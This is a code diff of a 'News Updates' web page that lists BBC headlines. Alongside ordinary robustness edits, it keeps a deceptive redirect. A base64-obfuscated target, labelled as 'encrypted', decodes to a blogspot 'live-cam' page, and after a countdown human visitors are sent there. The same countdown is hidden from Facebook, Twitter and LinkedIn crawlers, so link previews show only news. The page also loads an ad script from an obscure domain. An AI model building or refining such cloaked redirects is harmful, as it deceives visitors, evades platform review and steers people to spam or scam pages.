@@ -4,6 +4,9 @@
   <meta charset="UTF-8" />
   <title>News Updates</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- small inline favicon to avoid 404 requests -->
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23333'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-family='Arial' font-size='10' fill='%23fff'%3EN%3C/text%3E%3C/svg%3E">
+
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,6 +15,7 @@
       padding: 20px;
       background: #f0f2f5;
       color: #333;
+      display: block;
     }
     .banner {
       text-align: center;
@@ -60,6 +64,7 @@
       height: 70px;
       border-radius: 6px;
       object-fit: cover;
+      background: #ddd;
     }
     .news-content {
       flex: 1;
@@ -85,10 +90,75 @@
       padding: 20px;
       color: #666;
     }
+    .error {
+      color: #b00020;
+      text-align: center;
+      padding: 12px;
+    }
   </style>
 </head>
 <body>
+  <!-- NOTE: Define initPageAfterBanner and bannerTimeout BEFORE any external script may call it -->
+  <script>
+    // global timeout handle so both places can clear it
+    window.bannerTimeout = setTimeout(() => {
+      console.warn("Banner timeout after 5s — continuing page load...");
+      // call initPageAfterBanner with error=true if banner hasn't loaded
+      if (typeof window.initPageAfterBanner === 'function') {
+        window.initPageAfterBanner(true);
+      } else {
+        // if function not defined yet, set a minimal placeholder so external script won't throw,
+        // real function will call again when defined.
+        window.initPageAfterBanner = function(err){ window.__bannerPlaceholderCalled = true; console.warn('placeholder initPageAfterBanner called', err); };
+      }
+    }, 5000);
+
+    // define real initPageAfterBanner early so onload/onerror can call it immediately
+    window.initPageAfterBanner = function(error) {
+      if (window.__bannerLoaded) return; 
+      window.__bannerLoaded = true;
+      try { clearTimeout(window.bannerTimeout); } catch(e){}
+
+      console.log(error ? "Banner load failed or timed out" : "Banner loaded successfully");
+
+      // make sure body visible
+      document.body.style.display = "block";
+
+      // encrypted targets (kept from original)
+      const ENCRYPTED_TARGETS = [
+        'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbV8yNi5odG1s'
+      ];
+
+      function decryptTarget(encrypted) {
+        try { return atob(encrypted); } catch(e) { return '#'; }
+      }
+
+      function getRandomTarget() {
+        const idx = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
+        return decryptTarget(ENCRYPTED_TARGETS[idx]);
+      }
+
+      function isFacebookBot() {
+        return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
+      }
+
+      // Start countdown and news load only once
+      try {
+        // if the page was already initialized elsewhere, avoid double-init
+        if (!window.__pageInitialized) {
+          window.__pageInitialized = true;
+          // load news and start countdown
+          loadSimpleNews();
+          startCountdown();
+        }
+      } catch (e) {
+        console.error('Error during page init:', e);
+      }
+    };
+  </script>
+
   <div class="banner" id="banner-area">
+    <!-- external banner script may call initPageAfterBanner via onload/onerror -->
     <script 
       data-cfasync="false" 
       src="//oblivionplaysaltered.com/8e7b09b4d12552eca1c325a5cdeec882/invoke.js"
@@ -116,109 +186,145 @@
   </div>
 
   <script>
-    let bannerTimeout = setTimeout(() => {
-      console.warn("Banner timeout after 5s — continuing page load...");
-      initPageAfterBanner(true);
-    }, 5000);
+    // Helper: reliable small SVG placeholder data URI (used if external placeholder fails)
+    const SMALL_SVG_PLACEHOLDER = "data:image/svg+xml;utf8," +
+      encodeURIComponent(
+        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="70">' +
+        '<rect width="100%" height="100%" fill="#ddd"/>' +
+        '<text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="12" fill="#666">News</text>' +
+        '</svg>'
+      );
 
-    function initPageAfterBanner(error) {
-      if (window.__bannerLoaded) return; 
-      window.__bannerLoaded = true;
-      clearTimeout(bannerTimeout);
+    // Robust image onerror assign (to use for generated IMG tags)
+    function safeImgOnError(el) {
+      if (!el) return;
+      el.onerror = null;
+      el.src = SMALL_SVG_PLACEHOLDER;
+    }
 
-      console.log(error ? "Banner load failed or timed out" : "Banner loaded successfully");
-      document.body.style.display = "block"; 
+    // Main news loader (BBC via allorigins proxy to avoid CORS)
+    async function loadSimpleNews() {
+      const container = document.getElementById('news-container');
+      container.innerHTML = '<div class="loading">Loading latest news...</div>';
 
-      const ENCRYPTED_TARGETS = [
-        'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbV8yNi5odG1s'
-      ];
+      const rssFeed = 'https://feeds.bbci.co.uk/news/rss.xml';
+      const proxyURL = 'https://api.allorigins.win/get?url=' + encodeURIComponent(rssFeed);
 
-      function decryptTarget(encrypted) {
-        return atob(encrypted);
-      }
-
-      function getRandomTarget() {
-        const idx = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
-        return decryptTarget(ENCRYPTED_TARGETS[idx]);
-      }
-
-      function isFacebookBot() {
-        return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
-      }
-
-      // ✅ Sửa toàn bộ phần loadSimpleNews để hiển thị RSS BBC qua proxy
-      async function loadSimpleNews() {
-        const container = document.getElementById('news-container');
-        const rssFeed = 'https://feeds.bbci.co.uk/news/rss.xml';
-        const proxyURL = 'https://api.allorigins.win/get?url=' + encodeURIComponent(rssFeed);
-
-        try {
-          const res = await fetch(proxyURL);
-          const data = await res.json();
-
-          const parser = new DOMParser();
-          const xml = parser.parseFromString(data.contents, "application/xml");
-          const items = xml.querySelectorAll("item");
-
-          if (!items.length) {
-            container.innerHTML = '<div class="loading">No news found.</div>';
-            return;
-          }
-
-          let newsHTML = "";
-          items.forEach((item, i) => {
-            if (i >= 8) return;
-
-            const title = item.querySelector("title")?.textContent || "Untitled";
-            const link = item.querySelector("link")?.textContent || "#";
-            const pubDate = new Date(item.querySelector("pubDate")?.textContent).toLocaleDateString();
-            const description = item.querySelector("description")?.textContent || "";
-            const matchImg = description.match(/<img[^>]+src="([^"]+)"/);
-            const thumb = matchImg ? matchImg[1] : "https://via.placeholder.com/100x70?text=News";
-
-            newsHTML += `
-              <div class="news-item">
-                <img class="news-thumb" src="${thumb}" alt="">
-                <div class="news-content">
-                  <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
-                  <div class="news-meta">
-                    <span>BBC News</span>
-                    <span>${pubDate}</span>
-                  </div>
-                </div>
-              </div>
-            `;
-          });
-
-          container.innerHTML = newsHTML;
-        } catch (err) {
-          console.error("RSS load error:", err);
-          container.innerHTML = '<div class="loading">⚠️ Unable to load news.</div>';
+      try {
+        const res = await fetch(proxyURL, { cache: 'no-store' });
+        if (!res.ok) {
+          throw new Error('Network response was not ok: ' + res.status + ' ' + res.statusText);
         }
-      }
+        const data = await res.json();
+        if (!data || typeof data.contents !== 'string') {
+          throw new Error('Proxy did not return RSS contents');
+        }
 
-      function startCountdown() {
-        if (isFacebookBot()) {
-          document.getElementById('countdown-section').style.display = 'none';
-          document.getElementById('subdomain-info').style.display = 'none';
+        const parser = new DOMParser();
+        const xml = parser.parseFromString(data.contents, "application/xml");
+        // check for parsererror
+        if (xml.querySelector && xml.querySelector('parsererror')) {
+          const errNode = xml.querySelector('parsererror');
+          console.error('XML parse error:', errNode.textContent || errNode.innerHTML);
+          throw new Error('Failed to parse RSS XML');
+        }
+
+        const items = xml.querySelectorAll("item");
+        if (!items || items.length === 0) {
+          container.innerHTML = '<div class="loading">No news found.</div>';
           return;
         }
 
-        let seconds = 5;
-        const countdownEl = document.getElementById('countdown');
-        const timer = setInterval(() => {
-          seconds--;
-          countdownEl.textContent = seconds;
-          if (seconds <= 0) {
-            clearInterval(timer);
-            window.location.href = getRandomTarget();
-          }
-        }, 1000);
+        let newsHTML = "";
+        items.forEach((item, i) => {
+          if (i >= 8) return;
+          const title = item.querySelector("title")?.textContent?.trim() || "Untitled";
+          const link = item.querySelector("link")?.textContent?.trim() || "#";
+          const pubDateRaw = item.querySelector("pubDate")?.textContent;
+          const pubDate = pubDateRaw ? new Date(pubDateRaw).toLocaleDateString() : "";
+          const description = item.querySelector("description")?.textContent || "";
+          const matchImg = description.match(/<img[^>]+src=["']([^"']+)["']/i);
+          const thumbUrl = matchImg ? matchImg[1] : null;
+
+          // Inline onerror handler to fallback to SVG if the src fails
+          const imgTag = thumbUrl
+            ? `<img class="news-thumb" src="${thumbUrl}" alt="thumb" onerror="this.onerror=null;this.src='${SMALL_SVG_PLACEHOLDER}'">`
+            : `<img class="news-thumb" src="${SMALL_SVG_PLACEHOLDER}" alt="thumb">`;
+
+          newsHTML += `
+            <div class="news-item">
+              ${imgTag}
+              <div class="news-content">
+                <div class="news-title"><a href="${link}" target="_blank" rel="noopener noreferrer">${escapeHtml(title)}</a></div>
+                <div class="news-meta">
+                  <span>BBC News</span>
+                  <span>${escapeHtml(pubDate)}</span>
+                </div>
+              </div>
+            </div>
+          `;
+        });
+
+        container.innerHTML = newsHTML;
+      } catch (err) {
+        console.error("RSS load error:", err);
+        container.innerHTML = `<div class="error">⚠️ Unable to load news. ${escapeHtml(String(err.message || err))}</div>`;
+      }
+    }
+
+    // Simple HTML escape to avoid injecting broken HTML from feed
+    function escapeHtml(str) {
+      if (!str) return "";
+      return String(str).replace(/[&<>"']/g, function(m) {
+        return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m];
+      });
+    }
+
+    // Countdown logic
+    function startCountdown() {
+      // hide for known bots
+      if (/facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent)) {
+        const cs = document.getElementById('countdown-section');
+        const ss = document.getElementById('subdomain-info');
+        if (cs) cs.style.display = 'none';
+        if (ss) ss.style.display = 'none';
+        return;
       }
 
-      loadSimpleNews();
-      startCountdown();
+      const countdownEl = document.getElementById('countdown');
+      let seconds = parseInt(countdownEl?.textContent || '7', 10);
+      if (isNaN(seconds) || seconds <= 0) seconds = 7;
+
+      const timer = setInterval(() => {
+        seconds--;
+        if (countdownEl) countdownEl.textContent = seconds;
+        if (seconds <= 0) {
+          clearInterval(timer);
+          // safe redirect
+          try {
+            const encrypted = 'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbV8yNi5odG1s';
+            const target = atob(encrypted);
+            if (target && target !== '#') window.location.href = target;
+          } catch (e) {
+            console.warn('Redirect failed:', e);
+          }
+        }
+      }, 1000);
     }
+
+    // If banner script never loaded but placeholder called earlier, ensure we run real init once DOM ready.
+    document.addEventListener('DOMContentLoaded', function() {
+      // If placeholder was called earlier (banner timeout fired before real function defined), re-run real init
+      if (window.__bannerPlaceholderCalled) {
+        try { window.initPageAfterBanner(true); } catch(e){ console.error(e); }
+      }
+    });
+  </script>
+
+  <script>
+    // If the external banner script fails to define or call onload/onerror in time,
+    // the real initPageAfterBanner is already defined above and will be used.
+    // This extra script block is intentionally empty (kept for structure parity).
   </script>
 </body>
 </html>
